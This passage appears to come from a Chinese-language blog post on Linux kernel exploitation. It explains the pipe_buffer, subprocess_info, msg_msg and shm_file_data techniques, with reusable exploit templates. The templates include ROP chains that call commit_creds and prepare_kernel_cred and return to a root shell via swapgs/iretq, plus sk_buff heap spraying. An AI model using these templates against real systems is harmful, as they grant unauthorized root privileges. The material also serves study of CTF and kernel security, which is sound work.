<span class="number">-1001236736</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1018022144</span> has counter value <span class="number">10</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">Thread <span class="number">1636828928</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1586472704</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1594865408</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1603258112</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1569687296</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1578080000</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1628436224</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1645221632</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1611650816</span> has counter value <span class="number">6</span></span><br><span class="line">Thread <span class="number">1620043520</span> has counter value <span class="number">8</span></span><br></pre></td></tr></table></figure>
<h2 id="pipe-trick"><a href="#pipe-trick" class="headerlink" title="pipe trick"></a>pipe trick</h2><p>pipe 的读和写没有专门的函数，直接使用 write 和 read 操作之前 pipe 返回的文件描述符即可，pipefd[1] 用来写，pipefd[0] 用来读</p>
<p>结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> wait; <span class="comment">/* 等待队列,用于存储正在等待管道可读或者可写的进程 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nrbufs; <span class="comment">/* 表示未读数据已经占用了环形缓冲区的多少个内存页 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> curbuf; <span class="comment">/* 表示当前正在读取环形缓冲区的哪个内存页中的数据 */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> readers; <span class="comment">/* 表示正在读取管道的进程数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> writers; <span class="comment">/* 表示正在写入管道的进程数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> waiting_writers; <span class="comment">/* 表示等待管道可写的进程数 */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span> <span class="comment">/* 与管道关联的inode对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">bufs</span>[16];</span> <span class="comment">/* 管道缓冲区 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> <span class="comment">/* 指向包含管道缓冲区数据的页面 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len; <span class="comment">/* 页面内数据的偏移量,长度 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span> <span class="comment">/* 与此缓冲区关联的操作 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags; <span class="comment">/* 管道缓冲区标志 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>; <span class="comment">/* 运维人员拥有的私有数据 */</span></span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure>
<p>关于这个 pipe_buffer，有个小 trick：</p>
<ul>
<li>使用 write(pfd[1],buf,0x100)，就是使用管道传输信息<ul>
<li>write(pfd[1],buf,0x100) 执行之前，offset = 0，len = 0</li>
<li>write(pfd[1],buf,0x100) 执行之后，offset = 0，len = 0x100</li>
</ul>
</li>
<li>offset 和 len 都是4字节数据，如果把它们拼在一起，凑成8字节，就是 0x10000000000</li>
<li>如果我们用 UAF，使其 pipe_buffer 和另一个结构体重合，那么该结构体对应位置也会变为 0x10000000000</li>
<li>如果该结构体与内存管理有关，并且该位表示 size 的话，就可以造成堆溢出 </li>
</ul>
<h2 id="subprocess-info-attack"><a href="#subprocess-info-attack" class="headerlink" title="subprocess_info attack"></a>subprocess_info attack</h2><p>使用以下语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>会触发 <code>struct subprocess_info</code> 这个对象的分配，此结构为0x60大小，定义如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size:0x60(kmalloc-128) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>work.func：指向 call_usermodehelper_exec_work，可以泄露内核地址</li>
<li>cleanup：条件竞争控制这里可以执行任意函数</li>
</ul>
<p>此对象在分配时最终会调用 cleanup 函数，如果我们能在分配过程中把 cleanup 指针劫持为我们的 gadget，就能控制RIP，劫持的方法显而易见，即条件竞争</p>
<p>模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)arg;</span><br><span class="line">  info[<span class="number">0</span>] = (<span class="keyword">u_int64_t</span>)xchg_eax_esp; </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)xchg_eax_esp &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] hijacked_stack: %p\n&quot;</span>, (<span class="keyword">char</span> *)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>; </span><br><span class="line">  <span class="keyword">if</span>((fake_stack = mmap((<span class="keyword">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xfff</span>))),<span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>)) == MAP_FAILED)</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_stack addr: %p\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">  fake_stack[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">  <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = pop_rdi;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = prepare_kernel_cred;</span><br><span class="line">  hijacked_stack_ptr[index++] = mov_rdi_rax_je_pop_pop_ret;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = commit_creds;</span><br><span class="line">  hijacked_stack_ptr[index++] = swapgs;</span><br><span class="line">  hijacked_stack_ptr[index++] = iretq;</span><br><span class="line">  hijacked_stack_ptr[index++] = (<span class="keyword">u_int64_t</span>)getshell;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_cs;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rflags;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rsp;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_ss;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    write(fd, (<span class="keyword">void</span>*)info,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (race_flag) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这些 gadget 都可以通过 <code>ropper</code> 来找</li>
<li>commit_creds，prepare_kernel_cred 可以通过 <code>grep &lt;symbol_name&gt; /proc/kallsyms</code> 来找（记得开 root，关闭 kernel ASLR）</li>
<li>而 user_cs 这些寄存器的值，可以通过 <code>save_status</code> 来获取</li>
</ul>
<h2 id="msg-msg-leak"><a href="#msg-msg-leak" class="headerlink" title="msg_msg leak"></a>msg_msg leak</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size:0x28(kmalloc-*) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>当我们在一个消息队列上发送多个消息时，会形成如下结构：（msg 双向链表）</p>
<img src="/2022/05/21/kernel%20attack/1656410685806-1684734109382.png" class width="1656410685806"> 
<ul>
<li>去除掉 <code>msg_msg</code> 结构体本身的 0x30 字节的部分（或许可以称之为 header）剩余的部分都用来存放用户数据</li>
<li>因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的 </li>
</ul>
<p>而当我们单次发送大于 [一个页面大小 - header size] 大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体（只有一个 next 指针），其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p>
<img src="/2022/05/21/kernel%20attack/1656567331153-1684734109382.png" class width="1656567331153"> 
<ul>
<li>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体 </li>
<li>在读取 <code>msg_msg</code> 中的数据时，如果 <code>msg_msg-&gt;next</code> 不为空，程序就会把 <code>msg_msg-&gt;next</code> 指向的内容也当做是 <code>msg_msg data</code> 的一部分，如果 <code>msg_msgseg-&gt;next</code> 还不为空，就会继续读取 <code>msg_msgseg-&gt;next</code> 指向的内容</li>
</ul>
<p>利用-内核地址泄露：</p>
<ul>
<li>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，若是我们能够控制一个 msg_msg 的 header，将其 <code>msg_msg-&gt;m_ts</code> 成员改为一个较大的数，我们就能够越界读取出最多将近一张内存页大小的数据</li>
<li>若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们便能够完成内核空间中的任意地址读（<code>msg_msg-&gt;next</code> 指向的数据也会被当做 <code>msg_msg data</code>）<ul>
<li>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，我们需要保证该地址的数据为 NULL</li>
</ul>
</li>
</ul>
<p>相关接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建和获取ipc内核对象</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将消息发送到消息队列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从消息队列获取消息</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 查看、设置、删除ipc内核对象(用法和shmctl一样)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：消息队列的标识符，代表要从哪个消息列中获取消息</li>
<li>msgp： 存放消息结构体的地址（需要自己定义：<code>long type+char data[n]</code>）</li>
<li>msgsz：消息正文的字节数</li>
<li>msgtyp：消息的类型，可以有以下几种类型：<ul>
<li>msgtyp = 0：返回队列中的第一个消息</li>
<li>msgtyp &gt; 0：返回队列中消息类型为 msgtyp 的消息（常用）</li>
<li>msgtyp &lt; 0：返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li>
</ul>
</li>
<li>msgflg：函数的控制属性，其取值如下：<ul>
<li>0：msgrcv() 调用阻塞直到接收消息成功为止</li>
<li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li>
<li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li>
</ul>
</li>
</ul>
<p>PS：msg_msg 常常和 sk_buff 进行连用</p>
<h2 id="pipe-buffer-leak-attack"><a href="#pipe-buffer-leak-attack" class="headerlink" title="pipe_buffer leak+attack"></a>pipe_buffer leak+attack</h2><p><strong>pipe_buffer leak</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size:0x28*0x10(kmalloc-0x400) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object </li>
<li>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址</li>
</ul>
<p><strong>pipe_buffer attack</strong></p>
<p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buf_operations-&gt;release</code> 这一指针，可以把它覆盖为 shellcode</p>
<p>参考模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>]; <span class="comment">/* 伪造的pipe_buf_operations */</span></span><br><span class="line">ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset; <span class="comment">/* 伪造的pipe_buf_operations-&gt;release */</span></span><br><span class="line"></span><br><span class="line">rop_idx = <span class="number">0</span>;</span><br><span class="line">rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">rop_chain[rop_idx++] = user_cs;</span><br><span class="line">rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">rop_chain[rop_idx++] = user_sp;</span><br><span class="line">rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="shm-file-data-leak-attack"><a href="#shm-file-data-leak-attack" class="headerlink" title="shm_file_data leak+attack"></a>shm_file_data leak+attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size:0x20(kmalloc-32) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> shm_file_data(file) (*((struct shm_file_data **)&amp;(file)-&gt;private_data))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> <span class="title">shm_vm_ops</span> =</span> &#123;</span><br><span class="line">	.open	= shm_open,		<span class="comment">/* callback for a new vm-area open */</span></span><br><span class="line">	.close	= shm_close,	<span class="comment">/* callback for when the vm-area is released */</span></span><br><span class="line">	.fault	= shm_fault,</span><br><span class="line">	.split	= shm_split,</span><br><span class="line">	.pagesize = shm_pagesize,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_NUMA)</span></span><br><span class="line">	.set_policy = shm_set_policy,</span><br><span class="line">	.get_policy = shm_get_policy,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>ns，vm_ops：指向内核数据区域，因此可能发生泄漏（可以绕过 Kaslr）</li>
<li>file：文件指向堆区域，因此可能会泄漏 kernel_heapbase</li>
<li>vm_ops：可以覆写这里，但在特殊情况下，shmget 不会调用伪造的 vtable 函数指针 </li>
</ul>
<p>shmget：用于 Linux 进程通信(IPC)共享内存，共享内存函数由 shmget、shmat、shmdt、shmctl 四个函数组成</p>
<p>使用案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid = shmget(IPC_PRIVATE, <span class="number">100</span>, <span class="number">0600</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr == (<span class="keyword">void</span>*)<span class="number">-1</span>) &#123;</span><br><span class="line">    